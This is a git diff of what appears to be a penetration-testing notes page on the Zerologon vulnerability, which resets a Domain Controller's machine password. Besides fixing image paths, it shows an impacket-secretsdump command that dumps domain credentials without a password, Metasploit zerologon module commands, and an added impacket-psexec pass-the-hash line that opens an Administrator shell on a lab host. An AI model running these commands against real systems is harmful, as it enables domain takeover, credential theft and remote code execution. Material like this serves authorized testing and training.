@@ -23,7 +23,7 @@ pip install -r requirements.txt
 
 Running the script should results in Domain Controller's account password being reset to an empty string.
 
-![](<../../../.gitbook/assets/image (231).png>)
+![](<../../.gitbook/assets/image (231).png>)
 
 test to see if the password was reseted:
 
@@ -31,7 +31,7 @@ test to see if the password was reseted:
 impacket-secretsdump  -no-pass -just-dc MEGACORP.local/Lord_of_Domains\$@192.168.56.118
 ```
 
-![](<../../../.gitbook/assets/image (232).png>)
+![](<../../.gitbook/assets/image (232).png>)
 
 ## Using Metasploit
 
@@ -81,4 +81,10 @@ use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
 set ACTION RESTORE
 set PASSWORD 4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7bb7b88ad635a11f94de37e0d82495bab1dec25ac9d547910f94332f4598de372c07635fba1f6592bd3bb5aeb827cb088b1cae8db872b59e267ccfef1df40580c8d918befb3c39d809a6c89767a466f88f40eb373f86cf20c9b6a07e89b596e14a44eae6a4ae55b92a481b71452a3bbab2d5735d70868b778541f3c6e4d1c8c097c086bc40d364c01d4520b8a86a217ac79b4e826b9dc2eedd0a834146e3f6fba7422960dbd4051f499be61eca4e1aeba786030acfdd21e9f5a98a35a3f0430cf0b536bff99163118a1c75ec852cc2d
 run
+```
+
+## CMD Shell&#x20;
+
+```
+impacket-psexec -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:812d42b0faa0200aa3361267f518c3c5  domain.local/Administrator@192.168.120.247
 ```
